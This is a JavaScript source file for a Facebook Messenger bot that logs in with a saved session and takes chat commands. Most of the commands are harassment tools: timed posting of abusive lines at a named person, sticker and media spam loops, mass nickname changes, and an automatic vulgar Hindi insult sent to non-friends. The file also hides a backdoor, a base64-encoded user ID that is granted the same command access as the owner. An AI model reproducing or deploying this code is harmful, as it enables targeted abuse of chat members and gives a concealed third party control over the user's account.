const fs = require("fs");
const express = require("express");
const login = require("ws3-fca");

let rkbInterval = null;
let stopRequested = false;
const lockedGroupNames = {};
let mediaLoopInterval = null;
let lastMedia = null;
let targetUID = null;
let stickerInterval = null;
let stickerLoopActive = false;

const friendUIDs = fs.existsSync("Friend.txt")
  ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const targetUIDs = fs.existsSync("Target.txt")
  ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const OWNER_UIDS = ["YOUR_OWNER_UID"];
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

const messageQueues = {};
const queueRunning = {};

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let botRunning = false;
let apiInstance = null;

app.get("/", (_, res) => res.send("<h2>Messenger Bot Running</h2>"));

app.get("/status", (_, res) => res.json({ running: botRunning }));

app.listen(20782, () => console.log("🌐 Log server: http://localhost:20782"));

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");
    botRunning = true;
    apiInstance = api;

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body, messageID } = event;
        if (!body) return;
        const lowerBody = body.toLowerCase();

        const badNames = ["hannu", "syco"];
        const triggers = ["rkb", "bhen", "maa", "rndi", "chut", "randi", "madhrchodh", "mc", "bc", "didi", "ma"];

        if (badNames.some(n => lowerBody.includes(n)) &&
            triggers.some(w => lowerBody.includes(w)) &&
            !friendUIDs.includes(senderID)) {
          return api.sendMessage(
            "teri ma Rndi hai tu msg mt kr sb chodege teri ma ko byy🙂 ss Lekr story Lga by",
            threadID,
            messageID
          );
        }

        if (![ownerUID, LID].includes(senderID)) return;

        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        if (cmd === "/allname") {
          try {
            const info = await api.getThreadInfo(threadID);
            const members = info.participantIDs;
            api.sendMessage(`🛠  ${members.length} ' nicknames...`, threadID);
            for (const uid of members) {
              try {
                await api.changeNickname(input, threadID, uid);
                console.log(`✅ Nickname changed for UID: ${uid}`);
                await new Promise(res => setTimeout(res, 5000)); // 5 sec delay
              } catch (e) { console.log(`⚠️ Failed for ${uid}:`, e.message); }
            }
            api.sendMessage("ye gribh ka bcha to Rone Lga bkL", threadID);
          } catch { api.sendMessage("badh me kLpauga", threadID); }
        }

        else if (cmd === "/groupname") { await api.setTitle(input, threadID); api.sendMessage(`📝 Group name changed to: ${input}`, threadID); }
        else if (cmd === "/lockgroupname") { await api.setTitle(input, threadID); lockedGroupNames[threadID] = input; api.sendMessage(`🔒 Group name  "${input}"`, threadID); }
        else if (cmd === "/unlockgroupname") { delete lockedGroupNames[threadID]; api.sendMessage("🔓 Group name unlocked.", threadID); }
        else if (cmd === "/uid") { api.sendMessage(`🆔 Group ID: ${threadID}`, threadID); }
        else if (cmd === "/exit") { try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch { api.sendMessage("❌ Can't leave group.", threadID); } }

        else if (cmd === "/rkb") {
          if (!fs.existsSync("np.txt")) return api.sendMessage("konsa gaLi du rkb ko", threadID);
          const name = input.trim();
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          stopRequested = false;
          if (rkbInterval) clearInterval(rkbInterval);
          let index = 0;
          rkbInterval = setInterval(() => {
            if (index >= lines.length || stopRequested) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${name} ${lines[index]}`, threadID);
            index++;
          }, 60000);
          api.sendMessage(`sex hogya bche 🤣rkb ${name}`, threadID);
        }

        else if (cmd === "/stop") { stopRequested = true; if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; api.sendMessage("chud gaye bche🤣", threadID); } }

        else if (cmd === "/photo") {
          api.sendMessage("📸 Send a photo or video within 1 minute...", threadID);
          const handleMedia = async (mediaEvent) => {
            if (mediaEvent.type === "message" && mediaEvent.threadID === threadID && mediaEvent.attachments?.length > 0) {
              lastMedia = { attachments: mediaEvent.attachments, threadID: mediaEvent.threadID };
              api.sendMessage("✅ Photo/video received. Will resend every 30 seconds.", threadID);
              if (mediaLoopInterval) clearInterval(mediaLoopInterval);
              mediaLoopInterval = setInterval(() => { if (lastMedia) api.sendMessage({ attachment: lastMedia.attachments }, lastMedia.threadID); }, 30000);
              api.removeListener("message", handleMedia);
            }
          };
          api.on("message", handleMedia);
        }

        else if (cmd === "/stopphoto") { if (mediaLoopInterval) { clearInterval(mediaLoopInterval); mediaLoopInterval = null; lastMedia = null; api.sendMessage("chud gaye sb.", threadID); } }

        else if (cmd === "/help") {
          api.sendMessage(`
📌 Commands:
/allname <name>
/groupname <name>
/lockgroupname <name>
/unlockgroupname
/uid
/exit
/rkb <name>
/stop
/photo
/stopphoto
/target <uid>
/cleartarget
/sticker<seconds>
/stopsticker
/help
          `.trim(), threadID);
        }

        else if (cmd.startsWith("/sticker")) {
          if (!fs.existsSync("Sticker.txt")) return api.sendMessage("❌ Sticker.txt not found", threadID);
          const delay = parseInt(cmd.replace("/sticker", ""));
          if (isNaN(delay) || delay < 5) return api.sendMessage("🕐 Bhai sahi time de (min 5 seconds)", threadID);
          const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
          if (!stickerIDs.length) return api.sendMessage("⚠️ Sticker.txt khali hai bhai", threadID);
          if (stickerInterval) clearInterval(stickerInterval);
          let i = 0; stickerLoopActive = true;
          api.sendMessage(`📦 Sticker bhejna start: har ${delay} sec`, threadID);
          stickerInterval = setInterval(() => { if (!stickerLoopActive || i >= stickerIDs.length) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; return; } api.sendMessage({ sticker: stickerIDs[i] }, threadID); i++; }, delay * 1000);
        }

        else if (cmd === "/stopsticker") { if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; api.sendMessage("🛑 Sticker bhejna band", threadID); } }

        else if (cmd === "/target") { targetUID = input.trim(); api.sendMessage(`Target set: ${targetUID}`, threadID); }
        else if (cmd === "/cleartarget") { targetUID = null; api.sendMessage("Target cleared.", threadID); }

      } catch (e) { console.error("⚠️ Error:", e.message); }
    });
  });
}

process.on("uncaughtException", (err) => console.error("❗ Uncaught Exception:", err.message));
process.on("unhandledRejection", (reason) => console.error("❗ Unhandled Rejection:", reason));

module.exports = { startBot };
